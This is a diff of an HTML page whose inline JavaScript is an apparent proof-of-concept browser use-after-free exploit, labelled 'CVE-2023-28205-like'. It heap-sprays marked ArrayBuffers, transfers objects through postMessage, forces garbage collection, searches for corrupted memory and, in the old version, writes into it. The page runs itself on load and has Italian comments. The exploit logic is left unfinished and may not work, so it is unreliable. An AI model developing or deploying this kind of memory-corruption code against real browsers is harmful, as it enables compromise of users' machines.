@@ -1,93 +1,69 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Test</title>
-</head>
 <body>
-    <h1>Loading...</h1>
+<script>
+let sprayBuffers = [];
+let retained = { ref: null };
 
-    <script>
-        // exploit.js - CVE-2023-28205-like UAF PoC
-        let sprayBuffers = [];
-        let retained = { ref: null };
+function triggerGC() {
+  try {
+    new ArrayBuffer(1024 * 1024 * 100); // Allocazione massiva per forzare il GC
+  } catch(e) {
+    alert("GC Triggered");
+  }
+}
 
-        function triggerGC() {
-            try {
-                const tmp = [];
-                for (let i = 0; i < 100000; i++) {
-                    tmp.push(new Uint8Array(0x1000));
-                }
-            } catch(e) { alert("GC Error: " + e); }
+function setupPrimitive() {
+  const arr = [];
+  for (let i = 0; i < 100; i++) {
+    // Usa ArrayBuffer invece di Date (clonabile)
+    arr.push({ 
+      a: new Uint32Array([0x1337]), 
+      b: new ArrayBuffer(16) // Oggetto clonabile
+    });
+  }
+  return arr;
+}
+
+function heapSpray() {
+  const marker = 0x41414141;
+  for (let i = 0; i < 1000; i++) {
+    const buf = new ArrayBuffer(1024);
+    new Uint32Array(buf).set([marker]);
+    sprayBuffers.push(buf);
+  }
+  retained.ref = sprayBuffers;
+  alert("HEAP SPRAYED!");
+}
+
+async function main() {
+  try {
+    const vulnerable = setupPrimitive();
+    heapSpray();
+
+    addEventListener('message', (e) => {
+      setTimeout(() => {
+        triggerGC();
+        const corrupted = sprayBuffers.find(buf => 
+          new Uint32Array(buf)[0] !== 0x41414141
+        );
+        
+        if (corrupted) {
+          alert("UAF SUCCESSFUL!");
+          // Aggiungi logica di exploitation qui
         }
+      }, 100);
+    }, { once: true });
 
-        function setupPrimitive() {
-            const arr = [];
-            for (let i = 0; i < 100; i++) {
-                arr.push({ a: 0x1337, b: new Date(0xdeadbeef) });
-            }
-            return arr;
-        }
+    // Invia solo oggetti clonabili (ArrayBuffer)
+    postMessage(vulnerable, '*', vulnerable.map(x => x.b)); 
+    
+  } catch(e) {
+    alert("ERROR: " + e);
+  }
+}
 
-        function heapSpray() {
-            const marker = 0x41414141;
-            const bufferSize = 0x1000;
-
-            for (let i = 0; i < 0x500; i++) {
-                const buf = new ArrayBuffer(bufferSize);
-                const view = new Uint32Array(buf);
-                view[0] = marker;
-                sprayBuffers.push(buf);
-            }
-            retained.ref = sprayBuffers;
-            alert("Heap spraying completato!");
-        }
-
-        function findOverwrittenBuffer() {
-            for (let i = 0; i < sprayBuffers.length; i++) {
-                const view = new Uint32Array(sprayBuffers[i]);
-                if (view[0] !== 0x41414141) {
-                    alert("Buffer corrotto trovato alla posizione: " + i);
-                    return sprayBuffers[i];
-                }
-            }
-            return null;
-        }
-
-        async function main() {
-            try {
-                alert("Avvio exploit...");
-                const vulnerable = setupPrimitive();
-                heapSpray();
-
-                const prom = new Promise(resolve => {
-                    addEventListener('message', e => {
-                        setTimeout(() => {
-                            triggerGC();
-                            const targetBuf = findOverwrittenBuffer();
-                            
-                            if(targetBuf) {
-                                const magic = new Uint32Array(targetBuf);
-                                alert("Dati letti: 0x" + magic[0].toString(16));
-                                magic[2] = 0x58585858;
-                                alert("Scrittura riuscita!");
-                            }
-                            resolve();
-                        }, 500);
-                    }, { once: true });
-                });
-
-                postMessage(vulnerable, '*', [vulnerable[50].b]);
-                await prom;
-
-            } catch(e) {
-                alert("Errore critico: " + e);
-            }
-        }
-
-        // Avvia automaticamente dopo 2 secondi
-        setTimeout(() => {
-            main().catch(e => alert("Errore: " + e));
-        }, 2000);
-    </script>
+setTimeout(main, 2000);
+</script>
 </body>
 </html>
